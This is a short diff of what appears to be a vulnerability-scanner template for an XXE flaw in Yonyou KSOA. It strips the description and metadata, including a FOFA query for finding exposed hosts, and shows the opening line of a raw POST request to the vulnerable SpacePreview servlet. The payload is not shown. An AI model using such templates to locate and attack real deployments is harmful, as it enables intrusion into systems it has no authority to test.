@@ -3,12 +3,8 @@ info:
   name: 用友时空-KSOA com-sksoft-common-portal XXE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oqhyvqd8zufp15vn'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oqhyvqd8zufp15vn
-    fofa: body="productKSOA.jpg"
 http:
 - raw:
   - 'POST /servlet/com.sksoft.common.portal.SpacePreview HTTP/1.1
